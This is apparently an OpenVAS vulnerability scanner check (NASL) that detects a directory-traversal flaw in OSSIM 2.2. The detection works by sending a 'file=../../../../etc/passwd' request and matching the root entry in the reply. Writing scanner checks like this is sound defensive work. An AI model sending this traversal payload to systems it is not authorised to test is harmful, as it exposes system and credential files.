###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ossim_38780.nasl 14 2013-10-27 12:33:37Z jan $
#
# OSSIM 'file' Parameter Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "OSSIM is prone to a directory-traversal vulnerability because it fails
to sufficiently sanitize user-supplied input data.

Exploiting the issue may allow an attacker to obtain sensitive
information that could aid in further attacks.

OSSIM 2.2 is affected; other versions may also be vulnerable.";

tag_solution = "The vendor has released an update to address this issue. Please see
the references for more information.";

if (description)
{
 script_id(100542);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-03-19 11:14:17 +0100 (Fri, 19 Mar 2010)");
 script_bugtraq_id(38780);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");

 script_name("OSSIM 'file' Parameter Directory Traversal Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38780");
 script_xref(name : "URL" , value : "http://www.alienvault.com/community.php?section=News");
 script_xref(name : "URL" , value : "http://www.cybsec.com/vuln/cybsec_advisory_2010_0306_ossim2_2_arbitrary_file_download.pdf");
 script_xref(name : "URL" , value : "http://ossim.net/");

 script_description(desc);
 script_summary("Determine if OSSIM is prone to a directory-traversal vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_ossim_web_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!ossim = get_kb_item(string("www/", port, "/ossim")))exit(0);
if(!matches = eregmatch(string:ossim, pattern:"^(.+) under (/.*)$"))exit(0);
if(isnull(matches[2]))exit(0);

dir = matches[2];

url = string(dir,"/repository/download.php?file=../../../../../../../../etc/passwd&name=passwd.txt"); 
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
if( buf == NULL )continue;

if(egrep(pattern: "root:.*:0:[01]:.*", string: buf, icase: TRUE)) {
     
  security_warning(port:port);
  exit(0);

}

exit(0);

